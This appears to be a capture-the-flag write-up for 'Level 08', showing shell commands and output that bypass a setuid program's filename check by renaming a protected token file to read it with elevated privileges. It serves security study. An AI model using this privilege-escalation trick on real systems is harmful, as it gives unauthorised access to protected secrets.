# Level 08


<br>

### >> [Flag file](../flag) <<

<br>


#### Step 1:

- What's in the home directory:
```bash
ls -la
```

> ```
> dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
> d--x--x--x  1 root    users    340 Aug 30  2015 ..
> -r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
> -r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
> -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
> -r-x------  1 level08 level08  675 Apr  3  2012 .profile
> -rw-------  1 flag08  flag08    26 Mar  5  2016 token
> ```

> The `level08` program takes a file as an argument and cats it with `flag08` privileges. The `token` file is readable by the user `flag08`, so we can use it to get the flag.
>
> 1. It does not allow us to read the `token` file.
> ```bash
> ./level08 token
> ```
> > ```
> > You may not access 'token'
> > ```
>
> 2. But with a file with no privileges, a different message is displayed.
> ```bash
> touch /tmp/test
> chmod 000 /tmp/test
> ./level08 /tmp/test
> ```
> > ```
> > level08: Unable to open /tmp/test: Permission denied
> > ```
>
> 3. So it's not because of the file permissions. Let's check if it's because of the file name.
> ```bash
> touch /tmp/token
> ./level08 /tmp/token
> ```
> > ```
> > You may not access '/tmp/token'
> > ```


#### Step 2:

- Because the program just does not accept to read a file called `token`, we can just rename the `token` file to something else and read it.
```bash
chmod 777 .
mv token foobar
./level08 foobar
```


<br>

---

[<<](/level06/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; >>
